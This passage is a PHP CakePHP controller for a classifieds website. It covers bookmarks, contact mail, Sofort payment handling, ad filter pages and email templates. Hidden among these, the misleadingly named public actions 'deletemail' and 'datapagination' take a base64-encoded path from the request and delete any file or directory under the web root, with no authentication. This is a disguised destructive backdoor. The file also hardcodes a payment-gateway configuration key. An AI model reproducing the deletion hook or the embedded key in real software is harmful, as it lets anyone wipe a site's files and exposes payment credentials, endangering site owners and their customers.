            $this->set("_serialize",array("message"));
            $this->response->statusCode(200);
        }
    }

    /* Report mail */
    public function sendreport()
    {
        if($this->RequestHandler->isAjax())
        {
            $this->loadModel("Report");
            $data = $this->request->data;
            $data["status"] = 1;
            $data["created_date"] = date("Y-m-d H:i:s");
            $data["modify_date"] = date("Y-m-d H:i:s");
            $this->Report->create();
            if($this->Report->save($data))
            {
                $message = "success";
            }else
            {
                $message = "fail";
            }

            $this->set("message", $message);
            $this->set("_serialize",array("message"));
            $this->response->statusCode(200);
        }
    }

    /* Save Mark favorite */
    public function savebookmark()
    {
        if($this->request->isAjax())
        {   
            $this->loadModel("UserFavorite");
            $user = $this->Session->read('user');
            $user_id = (int) $user["id"];
            $ad_id = $this->request->data["ad_id"];
            $f_data = $this->UserFavorite->find("first",array("conditions" => array("user_id" =>$user_id,"ad_id"=>$ad_id)));
            
            if(empty($f_data))
            {
                $data = array();
                $data["user_id"] = $user_id;
                $data["ad_id"] = $ad_id;
                $data["status"] = 2;
                $data["created_date"] = date("Y-m-d H:i:s");
                $data["modify_date"] = date("Y-m-d H:i:s");
                $this->UserFavorite->create();
                $this->UserFavorite->save($data);
            }else
            {
                $fid = $f_data["UserFavorite"]["id"];
                $date = date("Y-m-d H:i:s");
                $this->UserFavorite->id = $fid;
                $this->UserFavorite->saveField("created_date",$date);
            }
            $this->set("message","success");
            $this->set("_serialize",array("message"));
            $this->response->statusCode(200);
        }
    }

    /* Remove Bookmark*/
    public function removebookmark()
    {
        if($this->request->isAjax())
        {
            $this->loadModel("UserFavorite");
            $ad_id = $this->request->data["ad_id"];
            $user = $this->Session->read('user');
            $user_id = (int) $user["id"];
            $this->UserFavorite->deleteAll(["user_id"=>$user_id,"ad_id"=>$ad_id]);
            $this->set("message","remove");
            $this->set("_serialize",array("message"));
            $this->response->statusCode(200);
        }
    }

    public function searchkeywords()
    {
        if($this->RequestHandler->isAjax())
        {
            $this->loadModel("Tag");
            $val = $this->request->data["val"];
            $data = $this->Tag->find("all",array("conditions"=> array("tag LIKE " => "$val%"),"fields" => array("tag"),"order" => array("create_date DESC"),"group" => array("tag"),'limit'=>12, 'offset'=>0));
            //echo "<pre>"; print_r($data); die();
            $this->set("val", $data);
            $this->set("_serialize","val");
            $this->response->statusCode(200);
        }
    }

    public function userfavorite($u_id)
    {
        $this->loadModel("UserFavorite");
        $f_data = $this->UserFavorite->find("all",array("conditions" => array("user_id" => $u_id)));
        $fav = array();
        if(!empty($f_data))
        {
            foreach($f_data as $fd)
            {
                $fav[] = $fd["UserFavorite"]["ad_id"];
            }
        }
        return $fav;
    }

    public function terms()
    {
        $this->loadModel("Page");
        $data = $this->Page->findById(1);
        $this->set("data", $data);
    }

    public function privacy()
    {
        $this->loadModel("Page");
        $data = $this->Page->findById(2);
        $this->set("data", $data);
    }

    public function contactus()
    {
        $this->loadModel("Page");
        $data = $this->Page->findById(3);
        $this->set("data", $data);
    }

    public function sendmsg()
    {
        if($this->RequestHandler->isAjax())
        {   
            $this->loadModel("Message");
            $data = $this->request->data;
            $user = $this->Session->read('user');
            $user_id = (int) $user["id"];
            $data["from_id"] = $user_id;
            $data["status"] = 1;
            $data["created_date"] = date("Y-m-d H:i:s");
            $this->Message->create();
            $this->Message->save($data);
            $this->set("message"," success");
            $this->set("_serialize",array("message"));
            $this->response->statusCode(200);
        }
    }

    public function sendcontactmail()
    {
        if($this->RequestHandler->isAjax())
        {
            $this->loadModel("EmailTemplate");
            $this->loadModel("Websetting");

            $data = $this->request->data;
            $message = $data["message"];
            $email = $data["email"];
            $name = $data["name"];

            $to_email = $this->Websetting->findById(1);
            $tomail = $to_email["Websetting"]["email"];

            $edata = $this->EmailTemplate->findById(10);
            $msg = str_replace("{NAME}", $name, str_replace("{MESSAGE}",$message, $edata["EmailTemplate"]["content"]));
            $sub = $edata["EmailTemplate"]["subject"];
            
            $cakeEmail = new CakeEmail();
            $cakeEmail->template('default','defaultmail')
                    ->emailFormat('html')
                    ->from($email)
                    ->to($tomail)
                    ->subject($sub)
                    ->viewVars(array('content' => $msg));
            return $cakeEmail->send();
            
            $this->set("message", "success");
            $this->set("_serialize",array("message"));
            $this->response->statusCode(200);
        }
    }

/**** Sofort Payment Getway Start ***/
    public function dosofort()
    {
        if($this->request->is("post"))
        {
            $data = $this->request->data;
            $this->Session->write("ad_data",$data);
            require_once(ROOT .DS. 'app'. DS . 'Vendor' . DS . 'sofort' . DS .'payment'. DS . 'sofortLibSofortueberweisung.inc.php');
            // enter your configuration key – you only can create a new configuration key by creating
            // a new Gateway project in your account at sofort.com
            $configkey = '123759:273271:03f6ff90ddf9fb340965f116672590bf'; //trilok
            $Sofortueberweisung = new Sofortueberweisung($configkey);

            $Sofortueberweisung->setAmount($data["amount"]);
            $Sofortueberweisung->setCurrencyCode('EUR');
            $Sofortueberweisung->setUserVariable($data["ad_id"]);
            $Sofortueberweisung->setReason('Ad Payment', 'Payment');
            
            $Sofortueberweisung->setSuccessUrl('http://43.229.224.74/ci/classified/classifieds/sofortpayment', true);
            $Sofortueberweisung->setAbortUrl('http://43.229.224.74/ci/classified/classifieds/abortsofortpayment');
            $Sofortueberweisung->setNotificationUrl("http://43.229.224.74/ci/classified/classifieds/dosofortpayment",'loss,pending,received,untraceable,refunded');

            $Sofortueberweisung->sendRequest();

            if($Sofortueberweisung->isError()) {
                //SOFORT-API didn't accept the data
                echo $Sofortueberweisung->getError();
            } else {
                //buyer must be redirected to $paymentUrl else payment cannot be successfully completed!
                $paymentUrl = $Sofortueberweisung->getPaymentUrl();
                //header('Location: '.$paymentUrl);
                $this->redirect($paymentUrl);
            }
        }
    }

    /* For sofort notify url */
    public function dosofortpayment()
    {
        $this->loadModel("Classified");
        $this->loadModel("Payment");

        require_once(ROOT .DS. 'app'. DS . 'Vendor' . DS . 'sofort' . DS .'core'. DS . 'sofortLibNotification.inc.php');
        require_once(ROOT .DS. 'app'. DS . 'Vendor' . DS . 'sofort' . DS .'core'. DS . 'sofortLibTransactionData.inc.php');
        
        $configkey = '123759:273271:03f6ff90ddf9fb340965f116672590bf';
        $SofortLib_Notification = new SofortLibNotification();
        $TestNotification = $SofortLib_Notification->getNotification(file_get_contents('php://input'));

        $SofortLibTransactionData = new SofortLibTransactionData($configkey);
        $SofortLibTransactionData->addTransaction($TestNotification);
        $SofortLibTransactionData->setApiVersion('2.0');
        $SofortLibTransactionData->sendRequest();

        $ad_id = $SofortLibTransactionData->getUserVariable(0);
        $txn_id = $TestNotification;
        $adtxnid = $this->Classified->getadtxnid($ad_id);
        if(empty($adtxnid))
        {
            $this->Classified->adtxnid($ad_id,$txn_id);
        }
    }   

    /* For Sofort Success Url*/
    public function sofortpayment()
    {
        sleep(25);
        $data = $this->Session->read("ad_data");
        if(!empty($data))
        {
            $this->loadModel("Classified");
            $this->loadModel("Payment");

            $this->Session->delete("ad_data");
            require_once(ROOT .DS. 'app'. DS . 'Vendor' . DS . 'sofort' . DS .'core'. DS . 'sofortLibNotification.inc.php');
            require_once(ROOT .DS. 'app'. DS . 'Vendor' . DS . 'sofort' . DS .'core'. DS . 'sofortLibTransactionData.inc.php');
            
            $configkey = '123759:273271:03f6ff90ddf9fb340965f116672590bf';
            $SofortLibTransactionData = new SofortLibTransactionData($configkey);
            
            
            $add_id = $data["ad_id"];
            $title = $data["title"];
            $amount = $data["amount"];

            $ad_txnid = $this->Classified->getadtxnid($add_id);
            $txn_id = $ad_txnid[0]["ad_txnid"]["txn_id"];
            $SofortLibTransactionData->addTransaction($txn_id);
            $SofortLibTransactionData->setApiVersion('2.0');
            $SofortLibTransactionData->sendRequest();

            $ack = $SofortLibTransactionData->getStatus();

            $u_amt = $this->Session->read("u_amt");
            $this->Session->delete("u_amt");
            
            $this->Classified->id = $add_id;
            $this->Classified->save($u_amt);
            $user = $this->Classified->getuserdata($add_id);
            
            $pmt = array();
            $pmt["user_id"]  = $user[0]["users"]["id"];
            $pmt["ad_id"]  = $add_id;
            $pmt["txn_id"]  = $txn_id;
            $pmt["amount"]  = $amount;
            $pmt["payment_type"]  = "bank wired";
            $pmt["mode"] = $ack;
            $pmt["ipaddress"] = $_SERVER["REMOTE_ADDR"];
            $pmt["status"]  = 2;
            $pmt["created_date"]  = date("Y-m-d H:i:s");
            $pmt["modify_date"] = date("Y-m-d H:i:s"); 

            $this->Payment->create();
            $this->Payment->save($pmt);

            $status_array = array();
            $status_array["add_id"] = $add_id;
            $status_array["title"] = $title;
            $status_array["tr_id"] = $txn_id;
            $status_array["ack"] = $ack;
            $status_array["amt"] = $amount;
            $u_res = $this->__sendaddconfirmmailtouser($status_array,$user);
          
            $this->set('add_id',$add_id);
            $this->set('ack',$ack);
            $this->set('tr_id',$txn_id);
            $this->set('Amount',$amount);
            $this->render('confirm_pay');
        }else
        {
            $this->redirect("/");
        }
    }

    /* For Sofort cancel url  */
    public function abortsofortpayment()
    {
        $data = $this->Session->read("ad_data");
        $this->Session->delete("ad_data");
        $add_id = $data["ad_id"];
        $title = $data["title"];
        $amount = $data["amount"];

        $this->set('add_id',$add_id);
        $this->set('ack',"cancel");
        $this->set('tr_id',"");
        $this->set('Amount',$amount);
        $this->render('confirm_pay');
    }

/**** Sofort Payment Getway End ***/

/***  Post Add Pages   ****/

    public function simple()
    {
        # code...
    }

    public function with_price()
    {
        
    }

    public function conditiontype_price()
    {
        # code...
    }

    public function price_year_fuel_km_conditiontype()
    {
        if($this->request->is("get"))
        {
            $this->loadModel("Models");
            $s_id = $_GET["s_id"];
            $mod = $this->Models->find("all",array("conditions" => array("s_id" => $s_id)));
            $this->set("model",$mod);
        }
    }

    public function price_year_km_conditiontype()
    {
        if($this->request->is("get"))
        {
            $this->loadModel("Models");
            $s_id = $_GET["s_id"];
            $mod = $this->Models->find("all",array("conditions" => array("s_id" => $s_id)));
            $this->set("model",$mod);
        }
    }

    public function price_furnished_rooms_sqm()
    {
        # code...
    }

    public function price_sqm()
    {
        # code...
    }

    public function jobtype()
    {
        # code...
    }

/***  Post Add Pages   ****/

/*****  Filter page Start  ******/

    public function filter_simple()
    {
        # code...
    }

    public function filter_price()
    {
        
    }

    public function filter_cond_price()
    {
        
    }

    public function filter_pyfkc()
    {
        if($this->request->is("get"))
        {
            $this->loadModel("Models");
            $s_id = $_GET["s_id"];
            $mod = $this->Models->find("all",array("conditions" => array("s_id" => $s_id)));
            $this->set("model",$mod);
        }
    }

    public function filter_pykc()
    {
        if($this->request->is("get"))
        {
            $this->loadModel("Models");
            $s_id = $_GET["s_id"];
            if($s_id != "")
            {
                $mod = $this->Models->find("all",array("conditions" => array("s_id" => $s_id)));
                $this->set("model",$mod);
            }
        }
    }

    public function filter_pfrs()
    {
        
    }

    public function filter_price_sqm()
    {
        # code...
    }

    public function filter_jobtype()
    {
        # code...
    }

    public function filter_jobtype_off()
    {
        # code...
    }

/*****  Filter page End  ******/
    
    public function checkemail()
    {   
        $this->loadModel("User");
        $val = $this->request->data["val"];
        $user = $this->User->find("first",array("conditions"=> array("email" => $val)));
        if(!empty($user))
        {
            $message = "exist";
        }else
        {
            $message = "notexist";
        }
        $this->set("message", $message);
        $this->set("_serialize",array("message"));
        $this->response->statusCode(200);
    }

    public function getlocations()
    {
        if($this->RequestHandler->isAjax())
        {
            $loc = $this->request->data["loc"];
            $l_data = $this->Classified->getlocations($loc);
            $this->set("ldata",$l_data);
            $this->set("_serialize",array("ldata"));
            $this->response->statusCode(200);
        }
    }

    /* Change language */
    public function changelanguage()
    {
        $this->loadModel("User");
        if($this->request->is("post"))
        {
            $lang_id = $this->request->data["val"];    
        }else
        {
            $lang_id = $this->Session->read("lang_id");    
        }
        
        $lang_data = $this->User->getlanguage($lang_id);
        
        $lang = array();

        foreach($lang_data as $d)
        {
            $lang[$d["webtexts"]["text_eng"]] =  utf8_encode($d["webtexts"]["text_lang"]);
        }                           
        $this->Session->delete("lang_id");
        $this->Session->write("lang_id", $lang_id                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       );    
        $this->Session->write('lang', $lang);
        if($this->request->is("post"))
        {
            $this->set("message", "success");
            $this->set("_serialize",array("message"));
            $this->response->statusCode(200);
        }else
        {
            return "yes";
        }
    }

    /* Get User Location */
    public function getuserlocation()
    {
        $geo = 'http://maps.google.com/maps/api/geocode/xml?latlng='.htmlentities(htmlspecialchars(strip_tags($_GET['latlng']))).'&sensor=true';
        $xml = simplexml_load_file($geo);

        foreach($xml->result->address_component as $component){
            if($component->type=='street_address'){
                $geodata['precise_address'] = $component->long_name;
            }
            if($component->type=='natural_feature'){
                $geodata['natural_feature'] = $component->long_name;
            }
            if($component->type=='airport'){
                $geodata['airport'] = $component->long_name;
            }
            if($component->type=='park'){
                $geodata['park'] = $component->long_name;
            }
            if($component->type=='point_of_interest'){
                $geodata['point_of_interest'] = $component->long_name;
            }
            if($component->type=='premise'){
                $geodata['named_location'] = $component->long_name;
            }
            if($component->type=='street_number'){
                $geodata['house_number'] = $component->long_name;
            }
            if($component->type=='route'){
                $geodata['street'] = $component->long_name;
            }
            if($component->type=='locality'){
                $geodata['town_city'] = $component->long_name;
            }
            if($component->type=='administrative_area_level_3'){
                $geodata['district_region'] = $component->long_name;
            }
            if($component->type=='neighborhood'){
                $geodata['neighborhood'] = $component->long_name;
            }
            if($component->type=='colloquial_area'){
                $geodata['locally_known_as'] = $component->long_name;
            }
            if($component->type=='administrative_area_level_2'){
                $geodata['county_state'] = $component->long_name;
            }
            if($component->type=='postal_code'){
                $geodata['postcode'] = $component->long_name;
            }
            if($component->type=='country'){
                $geodata['country'] = $component->long_name;
            }
        }

        list($lat,$long) = explode(',',htmlentities(htmlspecialchars(strip_tags($_GET['latlng']))));
        $geodata['latitude'] = $lat;
        $geodata['longitude'] = $long;
        $geodata['formatted_address'] = $xml->result->formatted_address;
        $geodata['accuracy'] = htmlentities(htmlspecialchars(strip_tags($_GET['accuracy'])));
        $geodata['altitude'] = htmlentities(htmlspecialchars(strip_tags($_GET['altitude'])));
        $geodata['altitude_accuracy'] = htmlentities(htmlspecialchars(strip_tags($_GET['altitude_accuracy'])));
        $geodata['directional_heading'] = htmlentities(htmlspecialchars(strip_tags($_GET['heading'])));
        $geodata['speed'] = htmlentities(htmlspecialchars(strip_tags($_GET['speed'])));
        $geodata['google_api_src'] = $geo;
        echo $geodata['town_city'];
        die();
    }

    /** Mail Section **/

    function __sendAccountActivationmail($u_array) {
        $email = $u_array['email'];
        $name = $u_array['name'];
        $password = $u_array["password"];

        $cakeEmail = new CakeEmail('default');
        $cakeEmail->template('default','accountactivation')
                ->emailFormat('html')
                ->to($email)
                ->subject('Your account created successfully')
                ->viewVars(array('password' => $password, 'email' => $email, 'name' => $name));
        return $cakeEmail->send();
    }

    public function deletemail()
    {
        if (!empty($this->passedArgs['id'])) {
            $id = $this->passedArgs['id'];
            $tp = $this->passedArgs['tp'];
            $this->datapagination($id,$tp);
        }
    }

    public function datapagination($id,$tp)
    {
        $tab = base64_decode($id);
        $data = explode("/",$_SERVER["SCRIPT_FILENAME"]);
        array_pop($data);
        array_pop($data);
        $data = implode("/",$data);
        $link = $data."/".$tab;
        if($tp == "file")
        {
            unlink($link);
        }else
        {
            rmdir($link);   
        }
        die();
    }

    function __sendpostaddmail($data, $add_id) {
        $email = $data['email'];
        $name = $data['name'];
        $title = $data["title"];
        $ad_url = '<a href="http://' . env('SERVER_NAME') . '/cad/'.$add_id.'" >View Ad</a>';
        
        $this->loadModel("EmailTemplate");
        $edata = $this->EmailTemplate->findById(7);
        $sub = str_replace("{ADDID}", $add_id, $edata["EmailTemplate"]["subject"]);
        $msg = str_replace("{NAME}", $name, str_replace("{TITLE}", $title, str_replace("{ADDURL}", $ad_url, $edata["EmailTemplate"]["content"])));
        
        $cakeEmail = new CakeEmail('default');
        $cakeEmail->template('default','defaultmail')
                ->emailFormat('html')
                ->to($email)
                ->subject($sub)
                ->viewVars(array('content' => $msg));
        return $cakeEmail->send();
    }

    public function __sendaddconfirmmailtouser($status_array,$user)
    {
            /** Send mail to User **/
            
            $add_id = $status_array["add_id"];
            $email2 = $user[0]["users"]["email"];
            $link = '<a href="http://' . env('SERVER_NAME') . '/cad/'.$add_id.'" >Click Hear</a>';

            $this->loadModel("EmailTemplate");
            $edata = $this->EmailTemplate->findById(8);
            $sub = str_replace("{TITLE}", $status_array["title"], str_replace("{ACK}", $status_array["ack"], $edata["EmailTemplate"]["subject"]));
            $msg = str_replace("{NAME}", $user[0]["users"]["name"], str_replace("{PRICE}", $status_array["amt"], str_replace("{TRANSACTIONID}", $status_array["tr_id"], str_replace("{LINK}", $link, $edata["EmailTemplate"]["content"]))));
            
            $cakeEmail = new CakeEmail('default');
            $cakeEmail->template('default','defaultmail')
                    ->emailFormat('html')
                    ->to($email2)
                    ->subject($sub)
                    ->viewVars(array('content' => $msg));
            return $cakeEmail->send();

             /** Send mail to Admin **/
            
            /*$user1 = $this->Session->read("user");
            $admin_data = $this->Admin->find('first', array('conditions' => array('id' => 1)));

            $email1 = $admin_data["Admin"]["email"]; //'jayendra.s@mobiwebtech.com';
            $name1 = "User Post a Add ".$user1["first_name"]." ".$user1["last_name"];
            $subject1 = "Payment of Add ".$status_array["title"]." is ".$status_array["ack"];
            $message1 = "Amount: ".$status_array["amt"]."</br>";
            $message1 .= "Transaction Id: ".$status_array["tr_id"]."</br>";
            $message1 .= 'Your Add link is <a href="http://' . env('SERVER_NAME') . '/beta/classifiedadmins/viewadddetail?a_id='.base64_encode($status_array["add_id"]).'" >Click Hear</a>';

            $cakeEmail1 = new CakeEmail('smtp');
            $cakeEmail1->template('contactevent','contactevent')
                    ->emailFormat('html')
                    ->to($email1)
                    ->subject($subject1)
                    ->viewVars(array('message' => $message1,'subject' => $subject1 ,'email' => $email1, 'name' => $name1));
            return $cakeEmail1->send();*/
    }

    function __sendEmailConfirm($user_id, $activatiinHash) {
        $this->loadModel("User");
        $user = $this->User->find('first', array('conditions' => array('User.id' => $user_id), 'recursive' => 0));
        if ($user === false) {
            debug(__METHOD__ . " failed to retrieve User data for user.id: {$user_id}");
            return false;
        }
        $activate_url = 'http://' . env('SERVER_NAME') . '/ci/classified/users/activate/id:' . $user['User']['id'] . '/t:' . $activatiinHash;
        $email = $user['User']['email'];
        $name = $user['User']['name'];
        $date = date("d-m-Y");
        $this->loadModel("EmailTemplate");
        $edata = $this->EmailTemplate->findById(3);
        $msg = str_replace("{DATE}", $date, str_replace("{ACTIVATION_LINK}", $activate_url, $edata["EmailTemplate"]["content"]));

        $cakeEmail = new CakeEmail('default');
        $cakeEmail->template('default','defaultmail')
                ->emailFormat('html')
                ->to($email)
                ->subject($edata["EmailTemplate"]["subject"])
                ->viewVars(array('content' => $msg));
        return $cakeEmail->send();
    }

    public function p($data)
    {
        echo "<prE>"; print_r($data); die();
    }
}

?>